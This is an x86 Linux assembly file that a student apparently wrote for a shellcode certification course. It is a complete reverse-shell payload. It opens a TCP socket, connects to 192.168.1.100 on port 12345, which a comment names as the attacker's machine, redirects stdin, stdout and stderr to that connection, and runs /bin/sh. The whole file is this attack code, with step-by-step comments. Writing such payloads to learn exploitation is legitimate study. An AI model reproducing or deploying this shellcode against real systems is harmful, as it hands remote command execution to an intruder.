;This shellcode has been created  for completing
;the requirements of the SecurityTube Linux
;Assembly Expert certification:
;http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert
;
;Student ID: SLAE-500

global _start

section .text

_start:
	xor eax,eax			;clearing the used registers
	mov ebx,eax
	;let's create a socket file descriptor
	mov al, 0x66		; socketcall
	push 0x6			; TCP
	push 0x1			; SOCK_STREAM
	push 0x2			; AF_INET	
	mov bl,0x1			; load the syscall socket(int domain, int type, int protocol)
	mov ecx,esp			; load the args pointer
	int 0x80			; call the sys_call
	mov edi,eax			; save the file descriptor
	
	;let's connect to the attacker's machine
	xor eax,eax			; clearing the used register
	mov bl,0x3			; load the syscall int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
	push dword 0x6401A8C0	; (ip=192.168.1.100) struct in_addr { unsigned long s_addr; }
	push word 0x3930	; (port=12345) struct sockaddr_in { short sin_family; unsigned short sin_port; struct in_addr sin_addr; char sin_zero[8]; }
	push word 0x2		; (AF_INET) struct sockaddr { unsigned short sa_family; char sa_data[14]; }
	mov ecx,esp			; save the struct sockaddr
	push 0x10			; size of struct
	push ecx			; struct
	push edi			; sockfd
	mov ecx,esp			; save all the connect parameters
	mov al,0x66			; socketcall
	int 0x80			; call the syscall

	;we now have a connection, let's duplicate the file descriptor of the connection to the stdin,stdout and stderr
	xor ecx,ecx			; clearing some registers
	mov cl, 0x2			; loop from 2 to 0
dup2:
	mov al, 0x3f		; load the syscall int dup2(int oldfd, int newfd);
	mov ebx, edi		; load the conection's file descriptor to be duplicated to stdin, stdout and stderr
	int 0x80			; call the sys_call
	dec ecx			
	jns dup2			; jump until SF
	inc ecx
	
	;last step: let's start the /bin/sh
	mov al, 0xb			; load the syscall int execve(const char *filename, char *const argv[], char *const envp[]);
	push ecx			; it should be 0, it's used as NULL terminator for string
	push dword 0x68732f2f 	;"sh//"
	push dword 0x6e69622f 	;"nib/"
	mov ebx, esp		; load the string
	push ecx			
	mov edx, esp
	push ebx
	mov ecx, esp
	int 0x80
	
	;;let's exit gracefully; not so because we didn't close the socket, but OS will do that for us
	;;this will be deleted when converted
	;mov eax, 0x1	; syscall exit
	;xor ebx,ebx		; exitcode 0
	;int 0x80		; call the sys_call
